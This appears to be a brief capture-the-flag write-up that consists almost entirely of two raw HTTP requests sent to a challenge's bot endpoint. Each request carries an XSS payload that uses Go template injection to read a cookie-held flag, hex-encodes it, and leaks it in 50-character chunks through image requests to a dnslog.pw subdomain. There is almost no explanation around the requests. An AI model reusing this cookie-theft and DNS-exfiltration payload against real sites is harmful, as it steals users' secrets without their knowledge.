# WP

Yakit

```
GET /bot?url={{url(http://127.0.0.1:8080/?GET={{url(<!DOCTYPE html>
<html>
<body>
<script>
    (async function evil() {
        await fetch('/flag');
        const res = await fetch('/?tmpl={{.Cookie (.Query .Request.Method)}}&GET=flag');
        const flag = [...await res.text()].map(a=>a.charCodeAt(0).toString(16)).join('');
        document.body.innerHTML+=`<img src="http://${flag.slice(0,50)}.u7byk63s.dnslog.pw">`
    })();
</script>
</body>
</html>)}}&tmpl={{url({{.Query .Request.Method}})}})}} HTTP/1.1
Host: 47.100.137.175:32193
```

```
GET /bot?url={{url(http://127.0.0.1:8080/?GET={{url(<!DOCTYPE html>
<html>
<body>
<script>
    (async function evil() {
        await fetch('/flag');
        const res = await fetch('/?tmpl={{.Cookie (.Query .Request.Method)}}&GET=flag');
        const flag = [...await res.text()].map(a=>a.charCodeAt(0).toString(16)).join('');
        document.body.innerHTML+=`<img src="http://${flag.slice(50,100)}.u7byk63s.dnslog.pw">`
    })();
</script>
</body>
</html>)}}&tmpl={{url({{.Query .Request.Method}})}})}} HTTP/1.1
Host: 47.100.137.175:32193
```